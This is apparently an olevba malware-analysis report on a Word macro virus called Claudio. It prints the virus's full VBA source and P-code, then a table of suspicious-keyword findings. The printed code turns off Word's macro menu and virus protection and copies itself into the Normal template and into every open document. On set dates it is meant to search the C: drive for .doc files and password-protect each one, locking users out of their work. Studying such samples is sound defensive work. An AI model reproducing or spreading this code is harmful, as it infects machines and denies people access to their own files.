olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Claud
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO Claudio2.cls 
in file: ./Virus.MSWord.Claud - OLE stream: 'Macros/VBA/Claudio2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_close()
On Error Resume Next
Dim jota As Integer, i As Integer, y As Integer, cadecodi As String
 Set AD = ActiveDocument.VBProject.VBComponents.Item(1)
 Set NT = NormalTemplate.VBProject.VBComponents.Item(1)
  CommandBars("tools").Controls("macro").Enabled = False
  Options.VirusProtection = False
  y = 0
  If AD.Name = "Claudio2" Then GoTo InfectNormal
  i = NT.CodeModule.ProcBodyLine("Document_Close", vbext_pk_Proc)
Claudio:
  jota = 0
  jota = AD.CodeModule.ProcBodyLine("Document_Close", vbext_pk_Proc)
  If jota = 0 Then
   jota = i
   Do While y < NT.CodeModule.ProcCountLines("Document_Close", vbext_pk_Proc)
     y = y + 1
     cadecodi = NT.CodeModule.Lines(jota, 1)
     AD.CodeModule.InsertLines y, cadecodi
     jota = jota + 1
   Loop
   AD.Name = "Claudio2"
   ActiveDocument.SaveAs ActiveDocument.FullName
  Else
    AD.CodeModule.ReplaceLine jota, "Sub Claudio"
    GoTo Claudio
  End If
 GoTo IYGH
InfectNormal:
If NT.Name <> "Claudio2" Then
i = AD.CodeModule.ProcBodyLine("Document_Close", vbext_pk_Proc)
jota = 0
jota = NT.CodeModule.ProcBodyLine("Document_Close", vbext_pk_Proc)
  If jota = 0 Then
   jota = i
   Do While y < AD.CodeModule.ProcCountLines("Document_Close", vbext_pk_Proc)
     y = y + 1
     cadecodi = AD.CodeModule.Lines(jota, 1)
     NT.CodeModule.InsertLines y, cadecodi
     jota = jota + 1
   Loop
   NT.Name = "Claudio2"
   NormalTemplate.Save
  Else
    NT.CodeModule.ReplaceLine jota, "Sub Claudio"
    GoTo InfectNormal
  End If
 End If
IYGH:
'Este es un V macro, Elaborado por c l a u d I o
'Este es el Comienzo de la era de los V Claudio
End Sub




























































Private Sub Document_Open()
On Error GoTo 0
Dim i, j As Integer
j = -1
For i = 1 To Application.VBE.VBProjects.Count
    If Application.VBE.VBProjects(i).Name = "Normal" Then
        j = i
    End If
   If Application.VBE.VBProjects(i).VBComponents(1).CodeModule.Find("Document_Open", 1, 1, 1000, 100) = False Then
        Dim B, l As Integer
            If j > 0 Then
                If Application.VBE.VBProjects(j).VBComponents(1).CodeModule.Find("Document_Open", 1, 1, 1000, 100) = True Then
                    B = Application.VBE.VBProjects(j).VBComponents(1).CodeModule.ProcStartLine("Document_Open", vbext_pk_Proc)
                    l = Application.VBE.VBProjects(j).VBComponents(1).CodeModule.ProcCountLines("Document_Open", vbext_pk_Proc)
                    Application.VBE.VBProjects(i).VBComponents(1).CodeModule.AddFromString Application.VBE.VBProjects(j).VBComponents(1).CodeModule.Lines(B, B + l)
                Else
                    B = Me.VBProject.VBComponents(1).CodeModule.ProcStartLine("Document_Open", vbext_pk_Proc)
                    l = Me.VBProject.VBComponents(1).CodeModule.ProcCountLines("Document_Open", vbext_pk_Proc)
                    Application.VBE.VBProjects(i).VBComponents(1).CodeModule.AddFromString Me.VBProject.VBComponents(1).CodeModule.Lines(B, B + l)
            End If
        End If
    End If
Next i
If (Month(Date) = 11 And Day(Date) = 10) Or (Month(Date) = 7 And Day(Date) = 1) Then
Set fs = Application.FileSearch
    fs.LookIn = "c:\"
    fs.FileName = "*.doc"
    fs.SearchSubFolders = True
    If fs.Execute() > 0 Then
        For i = 1 To fs.FoundFiles.Count
            On Error GoTo Exitsub
            Documents.Open FileName:=fs.FileSearch, ConfirmConversions:=False, ReadOnly:=False, AddToRecentFiles:=False
            Options.AllowFastSave = True
            Options.BackgroundSave = True
            Options.CreateBackup = False
            Options.SavePropertiesPrompt = False
            Options.SaveNormalPrompt = False
            ActiveDocument.Password = "xyz"
            ActiveDocument.Save
            ActiveDocument.Close
Exitsub:
        On Error GoTo 0
        Next i
    End If
End If
End Sub

-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSWord.Claud
' ===============================================================================
' Module streams:
' Macros/VBA/Claudio2 - 7462 bytes
' Line #0:
' 	FuncDefn (Private Sub Document_close())
' Line #1:
' 	OnError (Resume Next) 
' Line #2:
' 	Dim 
' 	VarDefn jota (As Integer)
' 	VarDefn i (As Integer)
' 	VarDefn y (As Integer)
' 	VarDefn cadecodi (As String)
' Line #3:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set AD 
' Line #4:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set NT 
' Line #5:
' 	LitVarSpecial (False)
' 	LitStr 0x0005 "macro"
' 	LitStr 0x0005 "tools"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Enabled 
' Line #6:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #7:
' 	LitDI2 0x0000 
' 	St y 
' Line #8:
' 	Ld AD 
' 	MemLd New 
' 	LitStr 0x0008 "Claudio2"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo InfectNormal 
' 	EndIf 
' Line #9:
' 	LitStr 0x000E "Document_Close"
' 	Ld vbext_pk_Proc 
' 	Ld NT 
' 	MemLd CodeModule 
' 	ArgsMemLd ProcBodyLine 0x0002 
' 	St i 
' Line #10:
' 	Label Claudio 
' Line #11:
' 	LitDI2 0x0000 
' 	St jota 
' Line #12:
' 	LitStr 0x000E "Document_Close"
' 	Ld vbext_pk_Proc 
' 	Ld AD 
' 	MemLd CodeModule 
' 	ArgsMemLd ProcBodyLine 0x0002 
' 	St jota 
' Line #13:
' 	Ld jota 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #14:
' 	Ld i 
' 	St jota 
' Line #15:
' 	Ld y 
' 	LitStr 0x000E "Document_Close"
' 	Ld vbext_pk_Proc 
' 	Ld NT 
' 	MemLd CodeModule 
' 	ArgsMemLd ProcCountLines 0x0002 
' 	Lt 
' 	DoWhile 
' Line #16:
' 	Ld y 
' 	LitDI2 0x0001 
' 	Add 
' 	St y 
' Line #17:
' 	Ld jota 
' 	LitDI2 0x0001 
' 	Ld NT 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St cadecodi 
' Line #18:
' 	Ld y 
' 	Ld cadecodi 
' 	Ld AD 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #19:
' 	Ld jota 
' 	LitDI2 0x0001 
' 	Add 
' 	St jota 
' Line #20:
' 	Loop 
' Line #21:
' 	LitStr 0x0008 "Claudio2"
' 	Ld AD 
' 	MemSt New 
' Line #22:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' Line #23:
' 	ElseBlock 
' Line #24:
' 	Ld jota 
' 	LitStr 0x000B "Sub Claudio"
' 	Ld AD 
' 	MemLd CodeModule 
' 	ArgsMemCall ReplaceLine 0x0002 
' Line #25:
' 	GoTo Claudio 
' Line #26:
' 	EndIfBlock 
' Line #27:
' 	GoTo IYGH 
' Line #28:
' 	Label InfectNormal 
' Line #29:
' 	Ld NT 
' 	MemLd New 
' 	LitStr 0x0008 "Claudio2"
' 	Ne 
' 	IfBlock 
' Line #30:
' 	LitStr 0x000E "Document_Close"
' 	Ld vbext_pk_Proc 
' 	Ld AD 
' 	MemLd CodeModule 
' 	ArgsMemLd ProcBodyLine 0x0002 
' 	St i 
' Line #31:
' 	LitDI2 0x0000 
' 	St jota 
' Line #32:
' 	LitStr 0x000E "Document_Close"
' 	Ld vbext_pk_Proc 
' 	Ld NT 
' 	MemLd CodeModule 
' 	ArgsMemLd ProcBodyLine 0x0002 
' 	St jota 
' Line #33:
' 	Ld jota 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #34:
' 	Ld i 
' 	St jota 
' Line #35:
' 	Ld y 
' 	LitStr 0x000E "Document_Close"
' 	Ld vbext_pk_Proc 
' 	Ld AD 
' 	MemLd CodeModule 
' 	ArgsMemLd ProcCountLines 0x0002 
' 	Lt 
' 	DoWhile 
' Line #36:
' 	Ld y 
' 	LitDI2 0x0001 
' 	Add 
' 	St y 
' Line #37:
' 	Ld jota 
' 	LitDI2 0x0001 
' 	Ld AD 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St cadecodi 
' Line #38:
' 	Ld y 
' 	Ld cadecodi 
' 	Ld NT 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #39:
' 	Ld jota 
' 	LitDI2 0x0001 
' 	Add 
' 	St jota 
' Line #40:
' 	Loop 
' Line #41:
' 	LitStr 0x0008 "Claudio2"
' 	Ld NT 
' 	MemSt New 
' Line #42:
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' Line #43:
' 	ElseBlock 
' Line #44:
' 	Ld jota 
' 	LitStr 0x000B "Sub Claudio"
' 	Ld NT 
' 	MemLd CodeModule 
' 	ArgsMemCall ReplaceLine 0x0002 
' Line #45:
' 	GoTo InfectNormal 
' Line #46:
' 	EndIfBlock 
' Line #47:
' 	EndIfBlock 
' Line #48:
' 	Label IYGH 
' Line #49:
' 	QuoteRem 0x0000 0x002F "Este es un V macro, Elaborado por c l a u d I o"
' Line #50:
' 	QuoteRem 0x0000 0x002E "Este es el Comienzo de la era de los V Claudio"
' Line #51:
' 	EndSub 
' Line #52:
' Line #53:
' Line #54:
' Line #55:
' Line #56:
' Line #57:
' Line #58:
' Line #59:
' Line #60:
' Line #61:
' Line #62:
' Line #63:
' Line #64:
' Line #65:
' Line #66:
' Line #67:
' Line #68:
' Line #69:
' Line #70:
' Line #71:
' Line #72:
' Line #73:
' Line #74:
' Line #75:
' Line #76:
' Line #77:
' Line #78:
' Line #79:
' Line #80:
' Line #81:
' Line #82:
' Line #83:
' Line #84:
' Line #85:
' Line #86:
' Line #87:
' Line #88:
' Line #89:
' Line #90:
' Line #91:
' Line #92:
' Line #93:
' Line #94:
' Line #95:
' Line #96:
' Line #97:
' Line #98:
' Line #99:
' Line #100:
' Line #101:
' Line #102:
' Line #103:
' Line #104:
' Line #105:
' Line #106:
' Line #107:
' Line #108:
' Line #109:
' Line #110:
' Line #111:
' Line #112:
' 	FuncDefn (Private Sub Document_Open())
' Line #113:
' 	OnError (GoTo 0) 
' Line #114:
' 	Dim 
' 	VarDefn i
' 	VarDefn j (As Integer)
' Line #115:
' 	LitDI2 0x0001 
' 	UMi 
' 	St j 
' Line #116:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Application 
' 	MemLd VBE 
' 	MemLd VBProjects 
' 	MemLd Count 
' 	For 
' Line #117:
' 	Ld i 
' 	Ld Application 
' 	MemLd VBE 
' 	ArgsMemLd VBProjects 0x0001 
' 	MemLd New 
' 	LitStr 0x0006 "Normal"
' 	Eq 
' 	IfBlock 
' Line #118:
' 	Ld i 
' 	St j 
' Line #119:
' 	EndIfBlock 
' Line #120:
' 	LitStr 0x000D "Document_Open"
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x03E8 
' 	LitDI2 0x0064 
' 	LitDI2 0x0001 
' 	Ld i 
' 	Ld Application 
' 	MemLd VBE 
' 	ArgsMemLd VBProjects 0x0001 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Find 0x0005 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #121:
' 	Dim 
' 	VarDefn B
' 	VarDefn l (As Integer)
' Line #122:
' 	Ld j 
' 	LitDI2 0x0000 
' 	Gt 
' 	IfBlock 
' Line #123:
' 	LitStr 0x000D "Document_Open"
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x03E8 
' 	LitDI2 0x0064 
' 	LitDI2 0x0001 
' 	Ld j 
' 	Ld Application 
' 	MemLd VBE 
' 	ArgsMemLd VBProjects 0x0001 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Find 0x0005 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #124:
' 	LitStr 0x000D "Document_Open"
' 	Ld vbext_pk_Proc 
' 	LitDI2 0x0001 
' 	Ld j 
' 	Ld Application 
' 	MemLd VBE 
' 	ArgsMemLd VBProjects 0x0001 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd ProcStartLine 0x0002 
' 	St B 
' Line #125:
' 	LitStr 0x000D "Document_Open"
' 	Ld vbext_pk_Proc 
' 	LitDI2 0x0001 
' 	Ld j 
' 	Ld Application 
' 	MemLd VBE 
' 	ArgsMemLd VBProjects 0x0001 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd ProcCountLines 0x0002 
' 	St l 
' Line #126:
' 	Ld B 
' 	Ld B 
' 	Ld l 
' 	Add 
' 	LitDI2 0x0001 
' 	Ld j 
' 	Ld Application 
' 	MemLd VBE 
' 	ArgsMemLd VBProjects 0x0001 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitDI2 0x0001 
' 	Ld i 
' 	Ld Application 
' 	MemLd VBE 
' 	ArgsMemLd VBProjects 0x0001 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #127:
' 	ElseBlock 
' Line #128:
' 	LitStr 0x000D "Document_Open"
' 	Ld vbext_pk_Proc 
' 	LitDI2 0x0001 
' 	Ld id_FFFF 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd ProcStartLine 0x0002 
' 	St B 
' Line #129:
' 	LitStr 0x000D "Document_Open"
' 	Ld vbext_pk_Proc 
' 	LitDI2 0x0001 
' 	Ld id_FFFF 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd ProcCountLines 0x0002 
' 	St l 
' Line #130:
' 	Ld B 
' 	Ld B 
' 	Ld l 
' 	Add 
' 	LitDI2 0x0001 
' 	Ld id_FFFF 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitDI2 0x0001 
' 	Ld i 
' 	Ld Application 
' 	MemLd VBE 
' 	ArgsMemLd VBProjects 0x0001 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #131:
' 	EndIfBlock 
' Line #132:
' 	EndIfBlock 
' Line #133:
' 	EndIfBlock 
' Line #134:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #135:
' 	Ld Date 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x000B 
' 	Eq 
' 	Ld Date 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x000A 
' 	Eq 
' 	And 
' 	Paren 
' 	Ld Date 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x0007 
' 	Eq 
' 	Ld Date 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x0001 
' 	Eq 
' 	And 
' 	Paren 
' 	Or 
' 	IfBlock 
' Line #136:
' 	SetStmt 
' 	Ld Application 
' 	MemLd FileSearch 
' 	Set fs 
' Line #137:
' 	LitStr 0x0003 "c:\"
' 	Ld fs 
' 	MemSt LookIn 
' Line #138:
' 	LitStr 0x0005 "*.doc"
' 	Ld fs 
' 	MemSt FileName 
' Line #139:
' 	LitVarSpecial (True)
' 	Ld fs 
' 	MemSt SearchSubFolders 
' Line #140:
' 	Ld fs 
' 	ArgsMemLd Execute 0x0000 
' 	LitDI2 0x0000 
' 	Gt 
' 	IfBlock 
' Line #141:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld fs 
' 	MemLd FoundFiles 
' 	MemLd Count 
' 	For 
' Line #142:
' 	OnError Exitsub 
' Line #143:
' 	Ld fs 
' 	MemLd FileSearch 
' 	ParamNamed FileName 
' 	LitVarSpecial (False)
' 	ParamNamed ConfirmConversions 
' 	LitVarSpecial (False)
' 	ParamNamed ReadOnly 
' 	LitVarSpecial (False)
' 	ParamNamed AddToRecentFiles 
' 	Ld Documents 
' 	ArgsMemCall Option 0x0004 
' Line #144:
' 	LitVarSpecial (True)
' 	Ld Options 
' 	MemSt AllowFastSave 
' Line #145:
' 	LitVarSpecial (True)
' 	Ld Options 
' 	MemSt BackgroundSave 
' Line #146:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt CreateBackup 
' Line #147:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SavePropertiesPrompt 
' Line #148:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #149:
' 	LitStr 0x0003 "xyz"
' 	Ld ActiveDocument 
' 	MemSt Password 
' Line #150:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #151:
' 	Ld ActiveDocument 
' 	ArgsMemCall Close 0x0000 
' Line #152:
' 	Label Exitsub 
' Line #153:
' 	OnError (GoTo 0) 
' Line #154:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #155:
' 	EndIfBlock 
' Line #156:
' 	EndIfBlock 
' Line #157:
' 	EndSub 
' Line #158:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Application.VBE     |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

